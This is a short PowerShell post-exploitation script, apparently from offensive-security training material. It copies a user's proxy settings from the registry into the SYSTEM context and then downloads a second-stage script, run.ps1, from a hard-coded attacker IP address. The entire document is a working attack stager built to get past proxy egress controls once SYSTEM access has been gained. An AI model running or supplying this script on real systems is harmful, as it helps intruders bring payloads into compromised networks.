# Use this script to get the proxy settings for a standard user account 
# and apply them to SYSTEM if network traffic is being routed through a proxy
# and we have SYSTEM level access

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = New-Object 
System.Net.WebProxy("http://$proxyAddr")
$wc = New-Object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run.ps1")
